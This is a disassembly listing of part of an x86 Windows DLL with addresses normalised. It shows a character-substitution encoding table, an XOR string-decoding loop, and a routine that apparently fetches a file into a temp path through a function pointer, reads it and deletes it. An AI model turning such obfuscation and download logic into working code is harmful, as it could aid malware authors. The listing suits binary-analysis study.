mov [ ebp - 0x4 ] 0xb981e3
call sub_10015630
mov [ eax ] 0x5e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8a81e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x61
mov [ ebp - 0x4 ] 0x9881e3
push ecx
mov ecx rw-data
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x8481e3
call sub_10015630
mov [ eax ] 0x63
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9581e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x64
mov [ ebp - 0x4 ] 0x9382e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0xaf81e3
call sub_10015630
mov [ eax ] 0x66
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8281e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x67
mov [ ebp - 0x4 ] 0x8f82e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0x8782e3
call sub_10015630
mov [ eax ] 0x69
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8082e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6a
mov [ ebp - 0x4 ] 0x9981e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0xb381e3
call sub_10015630
mov [ eax ] 0x6c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9282e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6d
mov [ ebp - 0x4 ] 0x8b81e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0x9181e3
call sub_10015630
mov [ eax ] 0x6f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbe81e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x70
mov [ ebp - 0x4 ] 0x9781e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9f81e3
call sub_10015630
mov [ eax ] 0x72
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8280e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x73
mov [ ebp - 0x4 ] 0x9381e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x8d82e3
call sub_10015630
mov [ eax ] 0x75
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c81e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x76
mov [ ebp - 0x4 ] 0xa381e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0xa681e3
call sub_10015630
mov [ eax ] 0x78
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8a82e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x79
mov [ ebp - 0x4 ] 0x8c82e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0xaa81e3
call sub_10015630
mov [ eax ] 0x31
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xae81e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x32
mov [ ebp - 0x4 ] 0xab81e3
push ecx
mov ecx rw-data
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xa181e3
call sub_10015630
mov [ eax ] 0x34
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c80e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x35
mov [ ebp - 0x4 ] 0x8382e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0x9e81e3
call sub_10015630
mov [ eax ] 0x37
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8d80e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x38
mov [ ebp - 0x4 ] 0xa981e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0x8282e3
call sub_10015630
mov [ eax ] 0x30
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8d81e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0x8b82e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3a
mov [ ebp - 0x4 ] 0xa881e3
call sub_10015630
mov [ eax ] 0x2e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8180e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2d
mov [ ebp - 0x4 ] 0xad81e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3f
mov [ ebp - 0x4 ] 0x9a81e3
call sub_10015630
mov [ eax ] 0x26
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8f81e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x5f
mov [ ebp - 0x4 ] 0x8181e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xacace7
call sub_10015630
mov [ eax ] 0x3c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x80b8e4
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3e
mov [ ebp - 0x4 ] 0x809ce6
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x8cbee5
call sub_10015630
mov [ eax ] 0x7e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb9e4
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x23
mov [ ebp - 0x4 ] 0x9abae4
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0x9f93e5
call sub_10015630
mov [ eax ] 0x5c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb6afe8
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3b
mov [ ebp - 0x4 ] 0x84bfe4
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] 0x99b2e6
call sub_10015630
mov [ eax ] 0x5e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9fb9e4
call sub_10015630
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x61
mov [ ebp - 0x4 ] 0xb1a8e8
push ecx
mov ecx rw-data
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x8fb0e5
call sub_10015630
mov [ eax ] 0x63
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb890e5
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x64
mov [ ebp - 0x4 ] 0x9985e7
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0x8580e8
call sub_10015630
mov [ eax ] 0x66
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb795e9
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x67
mov [ ebp - 0x4 ] 0x9a80e9
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0xb1a9e8
call sub_10015630
mov [ eax ] 0x69
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb89be7
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6a
mov [ ebp - 0x4 ] 0xb695e7
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0x8ca1e8
call sub_10015630
mov [ eax ] 0x6c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xba82e7
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6d
mov [ ebp - 0x4 ] 0xaaa6e8
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0xa1bfe4
call sub_10015630
mov [ eax ] 0x6f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x87abe8
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x70
mov [ ebp - 0x4 ] 0xb088e6
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9183e6
call sub_10015630
mov [ eax ] 0x72
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xad88e7
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x73
mov [ ebp - 0x4 ] 0xa6b5e7
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x88bae4
call sub_10015630
mov [ eax ] 0x75
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9389e6
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x76
mov [ ebp - 0x4 ] 0xb08de5
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0x9fa9e6
call sub_10015630
mov [ eax ] 0x78
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb4e6
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x79
mov [ ebp - 0x4 ] 0x87b6e6
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0x9cb5e6
call sub_10015630
mov [ eax ] 0x31
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9081e6
call sub_10015630
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x32
mov [ ebp - 0x4 ] 0xbc87e6
push ecx
mov ecx rw-data
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xb3aee5
call sub_10015630
mov [ eax ] 0x34
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9580e6
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x35
mov [ ebp - 0x4 ] 0x849ae7
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0x8785e5
call sub_10015630
mov [ eax ] 0x37
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8b89e6
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x38
mov [ ebp - 0x4 ] 0xbdb1e6
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0x8abbe8
call sub_10015630
mov [ eax ] 0x30
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb49be7
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3a
mov [ ebp - 0x4 ] 0x878de5
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0xb09ce5
call sub_10015630
mov [ eax ] 0x2e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb8e4
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3f
mov [ ebp - 0x4 ] 0xaeaee5
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x26
mov [ ebp - 0x4 ] 0xbc99e7
call sub_10015630
mov [ eax ] 0x2d
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xa8a1e8
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xb9a0e6
call sub_10015630
mov [ eax ] 0x5f
mov esp ebp
pop ebp
retn
sub_10035b10
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_10035b70
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_1002f4c0
mov [ esi + 0x4 ] 0x1
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_100796a0
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_10035c10
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffa
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xe
jb r-xdata
lea ecx [ ebx + 0x138 ]
xor eax eax
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x8 ] ax
call sub_10010930
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x70 ]
mov eax 0x111
call sub_100050e0
sub_10035c90
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
lea edx [ ebp - 0x84 ]
push r--data
push edx
mov edx 0x40
mov [ ebp - 0x88 ] 0x0
call sub_1006c960
add esp 0x10
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
lea eax [ ebp - 0x84 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x84 ]
push ecx
mov ecx esi
call sub_100531b0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10035d20
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_10050437
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_1002c5ed
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1002c5ed
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10016d10
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add ecx [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ esi + 0x10 ]
add ecx eax
push ecx
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10035e0c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10035e90
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
xor eax eax
push esi
test edx edx
je r-xdata
or eax 0xffffffff
mov ecx [ ecx ]
mov esi [ ebp + 0xc ]
pop esi
pop ebp
retn
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
cmp [ ecx ] esi
je r-xdata
sub_10035ec0
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
call edx
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
push eax
call [ DeleteFileW@IAT ]
pop esi
retn
mov eax [ eax ]
sub_10035efc
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movzx edx [ ecx ]
rol eax 0x8
add eax edx
add ecx 0x2
pop ebp
retn 0x8
sub_10035f1c
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_100014df
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_100492ed
sub_10035f44
push 0x8
push r--data
call sub_10079bf0
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001c36f
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1005b7cd
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_10023fbf
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10079c35
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001c36f
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1005b7cd
jmp r-xdata
sub_10035fe0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
push ecx
push edx
call eax
add esp 0x8
pop ebp
retn
sub_10035ffa
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_1000977c
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_1000977c
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_100360b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100826c6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x268
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x260 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x278 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
push 0x208
mov [ esp + 0x1c ] eax
mov ebx ecx
mov ecx [ ebp + 0x18 ]
lea eax [ esp + 0x68 ]
push 0x0
push eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x34 ] edx
call sub_10079a10
add esp 0xc
cmp [ ebx + 0x2e4 ] 0x0
mov [ esp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax 0x64
jmp r-xdata
push esi
mov ecx edi
lea esi [ esp + 0x4c ]
call sub_10039730
add esp 0x4
mov esi eax
lea eax [ ebx + 0x2c4 ]
lea edi [ esp + 0x2c ]
mov [ esp + 0x280 ] 0x0
call sub_10008720
mov esi 0x8
mov [ esp + 0x280 ] 0x2
cmp [ esp + 0x5c ] esi
jb r-xdata
mov ecx [ esp + 0x18 ]
mov [ ecx ] 0xc8
mov eax 0x6
jmp r-xdata
mov ecx [ esp + 0x278 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x260 ]
xor ecx esp
call sub_10024145
mov esp ebp
pop ebp
retn 0x18
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov edi [ esp + 0x28 ]
xor eax eax
mov [ ecx ] eax
mov [ edx ] eax
mov [ esp + 0x48 ] ax
mov [ edi ] eax
lea eax [ esp + 0x64 ]
push eax
push 0x0
push r--data
lea ecx [ ebx + 0xb8 ]
push ecx
mov [ esp + 0x6c ] 0x7
mov [ esp + 0x68 ] 0x0
call [ GetTempFileNameW@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x48 ]
push edx
call sub_1006591f
add esp 0x4
mov eax [ esp + 0x2c ]
mov [ esp + 0x20 ] r--data
mov [ esp + 0x24 ] 0x0
cmp [ esp + 0x40 ] esi
jae r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
lea edx [ esp + 0x20 ]
push edx
mov edx [ ebx + 0x2e0 ]
push 0x0
lea ecx [ esp + 0x6c ]
push ecx
push eax
push 0x0
call edx
test eax eax
jns r-xdata
lea eax [ esp + 0x2c ]
cmp [ esp + 0x64 ] 0x0
je r-xdata
cmp [ esp + 0x24 ] 0x0
jne r-xdata
mov [ esp + 0x10 ] 0x2
jmp r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
lea ecx [ esp + 0x64 ]
push ecx
call [ DeleteFileW@IAT ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
lea eax [ esp + 0x7c ]
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov esi [ Sleep@IAT ]
cmp [ esp + 0x40 ] 0x8
jb r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esi ]
test eax eax
je r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov [ edi ] eax
cmp eax 0xffffffff
je r-xdata
mov [ esp + 0x10 ] 0x3
jmp r-xdata
push 0x3e8
call esi
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov eax ebx
mov edx [ esp + 0x2c ]
push edx
call sub_1006591f
add esp 0x4
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi ] 0x0
mov [ edi ] 0x0
mov [ esp + 0x10 ] 0x4
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ esp + 0x14 ]
push 0x0
lea edx [ esp + 0x20 ]
push edx
mov [ ecx ] eax
mov ecx [ edi ]
push ecx
push eax
push esi
mov [ esp + 0x30 ] 0x0
call [ ReadFile@IAT ]
